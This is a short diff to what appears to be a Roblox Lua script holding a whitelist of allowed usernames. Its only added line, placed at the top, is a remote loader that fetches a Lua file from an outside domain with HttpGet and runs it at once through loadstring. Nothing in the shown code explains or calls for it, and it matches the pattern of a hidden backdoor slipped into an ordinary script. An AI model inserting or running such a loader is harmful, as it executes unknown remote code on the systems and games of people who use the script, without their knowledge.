@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
 local allowedUsers = {
     ["vxgore_06"] = true,
     ["dogedeptri_3"] = true,
